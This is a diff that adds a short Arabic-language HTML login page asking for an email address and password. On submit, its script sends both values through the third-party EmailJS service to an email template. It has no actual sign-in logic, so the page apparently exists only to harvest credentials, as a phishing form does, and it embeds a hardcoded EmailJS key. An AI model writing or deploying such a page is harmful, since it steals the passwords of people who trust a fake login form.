@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل دخول</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+    <div>
+        <label for="amil">البريد الإلكتروني:</label>
+        <input type="text" id="amil" name="amil">
+    </div>
+    <div>
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password">
+    </div>
+    <button onclick="submitForm()">دخول</button>
+
+    <script>
+        emailjs.init("RufM_4pBQfD6xWtE6");  // استبدل بـ User ID الخاص بك
+
+        function submitForm() {
+            const amil = document.getElementById('amil').value;
+            const password = document.getElementById('password').value;
+
+            // إرسال البيانات إلى قالب البريد الإلكتروني
+            const templateParams = {
+                amil: amil,
+                password: password,
+            };
+
+            // إرسال البريد الإلكتروني عبر EmailJS
+            emailjs.send('your_service_id', 'your_template_id', templateParams)
+                .then(function(response) {
+                    console.log('تم إرسال البيانات بنجاح', response);
+                }, function(error) {
+                    console.log('فشل في إرسال البيانات', error);
+                });
+        }
+    </script>
+</body>
+</html>
